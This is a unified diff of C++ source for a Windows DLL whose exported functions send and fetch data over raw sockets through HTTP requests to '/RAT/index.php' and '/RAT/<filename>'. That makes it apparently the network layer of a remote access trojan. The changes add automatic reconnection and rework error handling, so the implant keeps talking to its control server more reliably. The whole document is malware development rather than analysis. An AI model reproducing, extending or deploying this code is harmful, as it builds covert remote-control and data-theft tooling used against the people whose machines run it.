@@ -71,12 +71,22 @@ bool reconnect()
 
 __declspec(dllexport) int send_data(const std::string& filename, const std::string& data)
 {
+    if(clientSocket == INVALID_SOCKET)
+    {
+        std::cerr << "Socket is invalid. Reconnecting..." << std::endl;
+        if (!reconnect())
+        {
+            std::cerr << "Reconnection failed." << std::endl;
+            return 0;
+        }
+    }
     bool connected = TRUE;
     std::unique_lock<std::mutex> lock(socketMutex);
 
     while (connected)
     {
-        try {
+        try
+        {
             std::string requestString = "POST /RAT/index.php HTTP/1.1\r\n"
                                         H_NAME
                                         "Content-Length: " + std::to_string(filename.length() + data.length()) + "\r\n"
@@ -89,14 +99,16 @@ __declspec(dllexport) int send_data(const std::string& filename, const std::stri
                 int error = WSAGetLastError();
                 std::cerr << "Send failed with error: " << error << std::endl;
                 connected = false;
-                throw std::runtime_error("Send failed");
+                //throw std::runtime_error("Send failed");
+                // return 0;
             }
 
             char buffer[4096];
             int bytesReceived;
             std::string response;
 
-            do {
+            do
+            {
                 bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                 if (bytesReceived > 0)
                 {
@@ -126,21 +138,27 @@ __declspec(dllexport) int send_data(const std::string& filename, const std::stri
                     throw std::runtime_error("Receive failed");
                 }
             } while (bytesReceived == sizeof(buffer) - 1);
-            
-            return 0;
+            break;
         }
         catch (const std::exception& e)
         {
             std::cerr << "Exception in send_data: " << e.what() << std::endl;
+            return 0;
         }
-
     }
-    return 0;
+    return 1;
 }
 
 __declspec(dllexport) std::string receive_data(const std::string& filename)
 {
-
+    if(clientSocket == INVALID_SOCKET)
+    {
+        std::cerr << "Socket is invalid. Reconnecting..." << std::endl;
+        if (!reconnect())
+        {
+            std::cerr << "Reconnection failed." << std::endl;
+        }
+    }
     bool connected = TRUE;
 
     std::unique_lock<std::mutex> lock(socketMutex);
@@ -149,14 +167,14 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
         try
         {
             std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
-            H_NAME
-            "Connection: Keep-Alive\r\n\r\n";
+                                H_NAME
+                                "Connection: Keep-Alive\r\n\r\n";
             int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
             
             if (bytesSent == SOCKET_ERROR)
             {
                 int error = WSAGetLastError();
-                std::cerr << "Send failed with error: " << error << std::endl;
+                std::cerr << "Send failed with error(recieve_data): " << error << std::endl;
                 throw std::runtime_error("Send failed");
             }
 
@@ -192,8 +210,8 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
                     int error = WSAGetLastError();
                     if (error != WSAECONNRESET)
                     {
-                    std::cerr << "Receive failed with error: " << error << std::endl;
-                    throw std::runtime_error("Receive failed.");
+                        std::cerr << "Receive failed with error: " << error << std::endl;
+                        throw std::runtime_error("Receive failed.");
                     }
                 }
 
@@ -287,7 +305,7 @@ __declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::str
         if (bytesSent == SOCKET_ERROR)
         {
             int error = WSAGetLastError();
-            std::cerr << "Send failed with error: " << error << std::endl;
+            std::cerr << "Send failed with error (recieve_data_raw): " << error << std::endl;
             throw std::runtime_error("Send failed");
         }
 
